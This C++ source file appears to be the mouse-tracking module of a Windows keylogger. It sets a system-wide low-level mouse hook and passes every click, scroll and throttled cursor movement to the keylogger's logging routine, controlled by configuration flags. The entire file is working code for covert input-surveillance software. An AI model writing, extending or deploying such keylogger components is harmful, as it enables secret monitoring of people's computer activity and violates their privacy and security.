#include "mouse.h"
#include "configuration.h"
#include "keylogger.h"
#include <sstream>
#include <chrono>

HHOOK mouse_hook;

// Track last time mouse movement was logged
std::chrono::steady_clock::time_point last_mouse_movement;

LRESULT __stdcall mouse_hook_callback(int nCode, WPARAM wParam, LPARAM lParam) noexcept
{
    if (nCode >= 0) {
        MSLLHOOKSTRUCT* mouse_data = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam);
        
        // Track mouse clicks
        if (configuration::track_mouse_clicks) {
            switch (wParam) {
                case WM_LBUTTONDOWN:
                    keylogger::log_mouse(L"[LEFT_CLICK]", mouse_data);
                    break;
                case WM_RBUTTONDOWN:
                    keylogger::log_mouse(L"[RIGHT_CLICK]", mouse_data);
                    break;
                case WM_MBUTTONDOWN:
                    keylogger::log_mouse(L"[MIDDLE_CLICK]", mouse_data);
                    break;
                case WM_MOUSEWHEEL:
                    // Get scroll direction
                    SHORT scroll_direction = HIWORD(mouse_data->mouseData);
                    if (scroll_direction > 0) {
                        keylogger::log_mouse(L"[SCROLL_UP]", mouse_data);
                    } else {
                        keylogger::log_mouse(L"[SCROLL_DOWN]", mouse_data);
                    }
                    break;
            }
        }
        
        // Track mouse movements
        if (configuration::track_mouse_movement && wParam == WM_MOUSEMOVE && mouse::should_log_movement()) {
            keylogger::log_mouse(L"[MOUSE_MOVE]", mouse_data);
            last_mouse_movement = std::chrono::steady_clock::now();
        }
    }
    
    return CallNextHookEx(mouse_hook, nCode, wParam, lParam);
}

void mouse::set_hook() 
{
    mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, mouse_hook_callback, NULL, 0);
    last_mouse_movement = std::chrono::steady_clock::now();
}

std::wstring mouse::get_position() 
{
    POINT cursor_pos;
    GetCursorPos(&cursor_pos);
    
    std::wstringstream wss;
    wss << L"(" << cursor_pos.x << L"," << cursor_pos.y << L")";
    return wss.str();
}

bool mouse::should_log_movement() 
{
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        now - last_mouse_movement).count();
        
    return elapsed >= configuration::mouse_movement_interval_ms;
} 